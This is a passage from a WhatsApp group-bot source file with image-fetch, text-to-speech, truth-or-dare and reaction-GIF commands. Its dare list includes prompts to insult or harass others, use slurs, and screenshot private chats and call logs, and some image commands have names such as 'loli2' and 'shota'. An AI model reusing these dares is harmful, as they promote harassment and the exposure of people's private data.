if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/husbu.json')
if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/inori.json')
if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/islamic.json')
if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/isuzu.json')
if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/itachi.json')
if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/itori.json')
if (/jennie/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/jeni.json')
if (/jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/jiso.json')
if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/justina.json')
if (/kaga/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/kaga.json')
if (/kagura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/kagura.json')
if (/kakasih/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/kakasih.json')
if (/kaori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/kaori.json')
if (/cartoon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/kartun.json')
if (/shortquote/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/katakata.json')
if (/keneki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/keneki.json')
if (/kotori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/kotori.json')
if (/kpop/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/kpop.json')
if (/kucing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/kucing.json')
if (/kurumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/kurumi.json')
if (/lisa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/lisa.json')
if (/loli2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/loli.json')
if (/madara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/madara.json')
if (/megumin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/megumin.json')
if (/mikasa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/mikasa.json')
if (/mikey/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/mikey.json')
if (/miku/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/miku.json')
if (/minato/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/minato.json')
if (/mobile/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/mobil.json')
if (/motor/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/motor.json')
if (/mountain/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/mountain.json')
if (/naruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/naruto.json')
if (/nekonime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/nekonime.json')
if (/nezuko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/nezuko.json')
if (/onepiece/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/onepiece.json')
if (/pentol/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/pentol.json')
if (/pokemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/pokemon.json')
if (/profil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/profil.json')
if (/progamming/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/programming.json')
if (/pubg/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/pubg.json')
if (/randblackpink/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/randblackpink.json')
if (/randomnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/randomnime.json')
if (/randomnime2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/randomnime2.json')
if (/rize/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/rize.json')
if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/rose.json')
if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/ryujin.json')
if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/sagiri.json')
if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/sakura.json')
if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/sasuke.json')
if (/satanic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/satanic.json')
if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/shina.json')
if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/shinka.json')
if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/shinomiya.json')
if (/shizuka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/shizuka.json')
if (/shota/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/shota.json')
if (/space/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/tatasurya.json')
if (/technology/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/technology.json')
if (/tejina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/tejina.json')
if (/toukachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/toukachan.json')
if (/tsunade/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/tsunade.json')
if (/waifu2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/waifu.json')
if (/wallhp/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/wallhp.json')
if (/wallml/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/wallml.json')
if (/wallmlnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/wallnime.json')
if (/yotsuba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/yotsuba.json')
if (/yuki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/yuki.json')
if (/yulibocil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/yulibocil.json')
if (/yumeko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/yumeko.json')
let yeha = heyy[Math.floor(Math.random() * heyy.length)]
EliteProEmpire.sendMessage(m.chat, { image: { url: yeha }, caption : mess.success }, { quoted: m })
}
break
case 'pick': {
            	if (!m.isGroup) return reply("This command is for group use only.")
            	if (!text) return reply(`What do you want to pick?\nExample: ${prefix + command} idiot`)
             const groupMetadata = m.isGroup ? await EliteProEmpire.groupMetadata(m.chat)
                 .catch((e) => {}) : ""
             const participants = m.isGroup ? await groupMetadata.participants : ""
             let member = participants.map((u) => u.id)
             let me = m.sender
             let xeonshimts = member[Math.floor(Math.random() * member.length)]
             EliteProEmpire.sendMessage(from, { 
text: `The most *${text}* here is *@${xeonshimts.split("@")[0]}*`,
contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
mentionedJid:[xeonshimts],
"externalAdReply": {
"showAdAttribution": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"containsAutoReply": true,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./EliteProMedia/theme/elitepro.jpg`),
"sourceUrl": `${wagc}`
}
}
}, { quoted: m })
         }
     break
     case 'say': case 'tts': case 'gtts':{
if (!text) return reply('Where is the text?')
            let texttts = text
            const xeonrl = googleTTS.getAudioUrl(texttts, {
                lang: "en",
                slow: false,
                host: "https://translate.google.com",
            })
            return EliteProEmpire.sendMessage(m.chat, {
                audio: {
                    url: xeonrl,
                },
                mimetype: 'audio/mp4',
                ptt: true,
                fileName: `${text}.mp3`
            }, {
                quoted: m,
            })
        }
        break
    case 'fact': {
    	const { data } = await axios.get(`https://nekos.life/api/v2/fact`)
        return reply(`${themeemoji} *Fact:* ${data.fact}\n`)   
    }
    break
    case 'quotes':
const quotexeony = await axios.get(`https://favqs.com/api/qotd`)
        const textquotes = `*${themeemoji} Quote:* ${quotexeony.data.quote.body}\n\n*${themeemoji} Author:* ${quotexeony.data.quote.author}`
return reply(textquotes)
break
case 'dare':
              const dare =[
    "eat 2 tablespoons of rice without any side dishes, if it's dragging you can drink",
    "spill people who make you pause",
    "call crush/pickle now and send ss",
    "drop only emote every time you type on gc/pc for 1 day.",
    "say Welcome to Who Wants To Be a Millionaire! to all the groups you have",
    "call ex saying miss",
    "sing the chorus of the last song you played",
    "vn your ex/crush/girlfriend, says hi (name), wants to call, just a moment. I miss you so much",
	"Bang on the table (which is at home) until you get scolded for being noisy",
    "Tell random people _I was just told I was your twin first, we separated, then I had plastic surgery. And this is the most ciyusss_ thing",
    "mention ex's name",
    "make 1 rhyme for the members!",
    "send ur whatsapp chat list",
    "chat random people with gheto language then ss here",
    "tell your own version of embarrassing things",
    "tag the person you hate",
    "Pretending to be possessed, for example: possessed by dog, possessed by grasshoppers, possessed by refrigerator, etc.",
    "change name to *I AM DONKEY* for 24 hours",
    "shout *ma chuda ma chuda ma chuda* in front of your house",
    "snap/post boyfriend photo/crush",
    "tell me your boyfriend type!",
    "say *i hv crush on you, do you want to be my girlfriend?* to the opposite sex, the last time you chatted (submit on wa/tele), wait for him to reply, if you have, drop here",
    "record ur voice that read *titar ke age do titar, titar ke piche do titar*",
    "prank chat ex and say *i love u, please come back.* without saying dare!",
    "chat to contact wa in the order according to your battery %, then tell him *i am lucky to hv you!*",
    "change the name to *I am a child of randi* for 5 hours",
    "type in bengali 24 hours",
    "Use selmon bhoi photo for 3 days",
    "drop a song quote then tag a suitable member for that quote",
    "send voice note saying can i call u baby?",
    "ss recent call whatsapp",
    "Say *YOU ARE SO BEAUTIFUL DON'T LIE* to guys!",
    "pop to a group member, and say fuck you",
    "Act like a chicken in front of ur parents",
    "Pick up a random book and read one page out loud in vn n send it here",
    "Open your front door and howl like a wolf for 10 seconds",
    "Take an embarrassing selfie and paste it on your profile picture",
    "Let the group choose a word and a well known song. You have to sing that song and send it in voice note",
    "Walk on your elbows and knees for as long as you can",
    "sing national anthem in voice note",
    "Breakdance for 30 seconds in the sitting roomðŸ˜‚",
    "Tell the saddest story you know",
    "make a twerk dance video and put it on status for 5mins",
    "Eat a raw piece of garlic",
    "Show the last five people you texted and what the messages said",
    "put your full name on status for 5hrs",
    "make a short dance video without any filter just with a music and put it on ur status for 5hrs",
    "call ur bestie, bitch",
    "put your photo without filter on ur status for 10mins",
    "say i love oli london in voice noteðŸ¤£ðŸ¤£",
    "Send a message to your ex and say I still like you",
    "call Crush/girlfriend/bestie now and screenshot here",
    "pop to one of the group member personal chat and Say you ugly bustard",
    "say YOU ARE BEAUTIFUL/HANDSOME to one of person who is in top of ur pinlist or the first person on ur chatlist",
    "send voice notes and say, can i call u baby, if u r boy tag girl/if girl tag boy",
    "write i love you (random grup member name, who is online) in personal chat, (if u r boy write girl name/if girl write boy name) take a snap of the pic and send it here",
    "use any bollywood actor photo as ur pfp for 3 days",
    "put your crush photo on status with caption, this is my crush",
    "change name to I AM GAY for 5 hours",
    "chat to any contact in whatsapp and say i will be ur bf/gf for 5hours",
    "send voice note says i hv crush on you, want to be my girlfriend/boyfriend or not? to any random person from the grup(if u girl choose boy, if boy choose girl",
    "slap ur butt hardly send the sound of slap through voice noteðŸ˜‚",
    "state ur gf/bf type and send the photo here with caption, ugliest girl/boy in the world",
    "shout bravooooooooo and send here through voice note",
    "snap your face then send it here",
    "Send your photo with a caption, i am lesbian",
    "shout using harsh words and send it here through vn",
    "shout you bastard in front of your mom/papa",
    "change the name to i am idiot for 24 hours",
    "slap urself firmly and send the sound of slap through voice noteðŸ˜‚",
    "say i love the bot owner xeon through voice note",
    "send your gf/bf pic here",
    "make any tiktok dance challenge video and put it on status, u can delete it after 5hrs",
    "breakup with your best friend for 5hrs without telling him/her that its a dare",
     "tell one of your frnd that u love him/her and wanna marry him/her, without telling him/her that its a dare",
     "say i love depak kalal through voice note",
     "write i am feeling horny and put it on status, u can delete it only after 5hrs",
     "write i am lesbian and put it on status, u can delete only after 5hrs",
     "kiss your mommy or papa and say i love youðŸ˜Œ",
     "put your father name on status for 5hrs",
     "send abusive words in any grup, excepting this grup, and send screenshot proof here"
]
              const xeondare = dare[Math.floor(Math.random() * dare.length)]
              bufferdare = await getBuffer(`https://i.ibb.co/gLNc5SGK/ce5871f200bb421678c982f5af52d7fd.jpg`)
              EliteProEmpire.sendMessage(from, { image: bufferdare, caption: '_You choose DARE_\n'+ xeondare }, {quoted:m})
              break
                            break
       case 'truth':
              const truth =[
    "Have you ever liked anyone? How long?",
    "If you can or if you want, which gc/outside gc would you make friends with? (maybe different/same type)",
    "apa ketakutan terbesar kamu?",
    "Have you ever liked someone and felt that person likes you too?",
    "What is the name of your friend's ex-girlfriend that you used to secretly like?",
    "Have you ever stolen money from your father or mom? The reason?",
    "What makes you happy when you're sad?",
    "Ever had a one sided love? if so who? how does it feel bro?", 
    "been someone's mistress?",
    "the most feared thing",
    "Who is the most influential person in your life?",
    "what proud thing did you get this year", 
    "Who is the person who can make you awesome", 
    "Who is the person who has ever made you very happy?", 
    "Who is closest to your ideal type of partner here", 
    "Who do you like to play with??", 
    "Have you ever rejected people? the reason why?",
    "Mention an incident that made you hurt that you still remember", 
    "What achievements have you got this year??",
    "What's your worst habit at school??",
    "What song do you sing most in the shower",
    "Have you ever had a near-death experience",
    "When was the last time you were really angry. Why?",
    "Who is the last person who called you",
    "Do you have any hidden talents, What are they",
    "What word do you hate the most?",
    "What is the last YouTube video you watched?",
    "What is the last thing you Googled",
    "Who in this group would you want to swap lives with for a week",
    "What is the scariest thing thats ever happened to you",
    "Have you ever farted and blamed it on someone else",
    "When is the last time you made someone else cry",
    "Have you ever ghosted a friend",
    "Have you ever seen a dead body",
    "Which of your family members annoys you the most and why",
    "If you had to delete one app from your phone, which one would it be",
    "What app do you waste the most time on",
    "Have you ever faked sick to get home from school",
    "What is the most embarrassing item in your room",
    "What five items would you bring if you got stuck on a desert island",
    "Have you ever laughed so hard you peed your pants",
    "Do you smell your own farts",
    "have u ever peed on the bed while sleeping ??",
    "What is the biggest mistake you have ever made",
    "Have you ever cheated in an exam",
    "What is the worst thing you have ever done",
    "When was the last time you cried",
    "whom do you love the most among ur parents", 
    "do u sometimes put ur finger in ur nosetril?", 
    "who was ur crush during the school days",
    "tell honestly, do u like any boy in this grup",
    "have you ever liked anyone? how long?",
    "do you have gf/bf','what is your biggest fear?",
    "have you ever liked someone and felt that person likes you too?",
    "What is the name of your ex boyfriend of your friend that you once liked quietly?",
    "ever did you steal your mothers money or your fathers money",
    "what makes you happy when you are sad",
    "do you like someone who is in this grup? if you then who?",
    "have you ever been cheated on by people?",
    "who is the most important person in your life",
    "what proud things did you get this year",
    "who is the person who can make you happy when u r sad",
    "who is the person who ever made you feel uncomfortable",
    "have you ever lied to your parents",
    "do you still like ur ex",
    "who do you like to play together with?",
    "have you ever stolen big thing in ur life? the reason why?",
    "Mention the incident that makes you hurt that you still remember",
    "what achievements have you got this year?",
    "what was your worst habit at school?",
    "do you love the bot creator, xeon?ðŸ¤£",
    "have you ever thought of taking revenge from ur teacher?",
    "do you like current prime minister of ur country",
    "you non veg or veg",
    "if you could be invisible, what is the first thing you would do",
    "what is a secret you kept from your parents",
    "Who is your secret crush",
    "whois the last person you creeped on social media",
    "If a genie granted you three wishes, what would you ask for",
    "What is your biggest regret",
    "What animal do you think you most look like",
    "How many selfies do you take a day",
    "What was your favorite childhood show",
    "if you could be a fictional character for a day, who would you choose",
    "whom do you text the most",
    "What is the biggest lie you ever told your parents",
    "Who is your celebrity crush",
    "Whats the strangest dream you have ever had",
    "do you play pubg, if you then send ur id number"
]
              const xeontruth = truth[Math.floor(Math.random() * truth.length)]
              buffertruth = await getBuffer(`https://i.ibb.co/gLNc5SGK/ce5871f200bb421678c982f5af52d7fd.jpg`)
              EliteProEmpire.sendMessage(from, { image: buffertruth, caption: '_You choose TRUTH_\n'+ xeontruth }, {quoted:m})
              break
              case 'hug': {

        if (!m.isGroup) return reply("This command is for group use only.")
        if (!m.mentionedJid[0] && !m.quoted) return reply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/hug`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} hugged themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} hugged @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          EliteProEmpire.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'cry': {

        if (!m.isGroup) return reply("This command is for group use only.")
        if (!m.mentionedJid[0] && !m.quoted) return reply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/cry`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} cried themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} cried @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          EliteProEmpire.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'kill': {

        if (!m.isGroup) return reply("This command is for group use only.")
        if (!m.mentionedJid[0] && !m.quoted) return reply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/kill`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} killed themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} killed @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          EliteProEmpire.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'pat': {

        if (!m.isGroup) return reply("This command is for group use only.")
        if (!m.mentionedJid[0] && !m.quoted) return reply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/pat`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} patted themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} patted @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          EliteProEmpire.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'lick': {

        if (!m.isGroup) return reply("This command is for group use only.")
        if (!m.mentionedJid[0] && !m.quoted) return reply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/lick`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} licked themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} licked @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          EliteProEmpire.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'kiss': {

        if (!m.isGroup) return reply("This command is for group use only.")
        if (!m.mentionedJid[0] && !m.quoted) return reply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/kiss`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} kissed themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} kissed @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          EliteProEmpire.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'bite': {

        if (!m.isGroup) return reply("This command is for group use only.")
        if (!m.mentionedJid[0] && !m.quoted) return reply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/cry`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} bit themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} bit @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          EliteProEmpire.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'yeet': {

        if (!m.isGroup) return reply("This command is for group use only.")
        if (!m.mentionedJid[0] && !m.quoted) return reply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/yeet`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} yeeted themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} yeeted @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          EliteProEmpire.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'bully': {

        if (!m.isGroup) return reply("This command is for group use only.")
        if (!m.mentionedJid[0] && !m.quoted) return reply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/bully`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} bullied themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} bullied @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          EliteProEmpire.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'bonk': {

        if (!m.isGroup) return reply("This command is for group use only.")
        if (!m.mentionedJid[0] && !m.quoted) return reply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/bonk`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} bonked themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} bonked @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          EliteProEmpire.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

